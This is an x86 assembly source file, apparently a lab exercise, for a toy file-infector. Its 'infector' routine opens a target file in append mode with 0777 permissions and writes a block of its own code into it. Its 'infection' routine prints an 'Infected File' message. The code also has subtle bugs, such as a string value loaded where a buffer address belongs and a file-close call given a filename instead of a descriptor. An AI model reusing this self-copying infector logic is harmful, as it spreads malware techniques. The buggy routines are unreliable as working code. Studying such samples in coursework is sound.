section .rodata
hello: DB "Hello, Infected File", 10, 0 ;print out string

section .text
global _start
global system_call
global infection
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

    mov     eax, 4          ; do: SYS_WRITE
    mov     ebx, 1          ; to: STDOUT
    push "HE"
    pop ecx
    ;mov     ecx, hello      ; with content of string: "Hello, Infected File", 10, 0
    mov     edx, 21         ; number of bytes to write
    int     0x80            ; Transfer control to operating system
    popad                   ; Restore caller state (registers)
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 1          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, 5          ; do: SYS_OPEN
    mov     ebx, [ebp+8]    ; to file name: from arg
    mov     ecx, 1024+1       ; for: append and write
    mov     edx, 0777       ; with permission 0777 (all)
    int     0x80            ; Transfer control to operating system

    mov     ebx, eax        ; to: file descriptor returned by open
    mov     eax, 4          ; do: SYS_WRITE
    mov     ecx, code_start ; whith the code starting from code_start
    mov     edx, 94 ; and ending at code_end
    int     0x80            ; Transfer control to operating system

    mov     eax, 6          ; do: SYS_CLOSE
    mov     ebx, [ebp+8]    ; to file name: from arg
    int     0x80            ; Transfer control to operating system
    popad                   ; Restore caller state (registers)
    add     esp, 1          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_end:
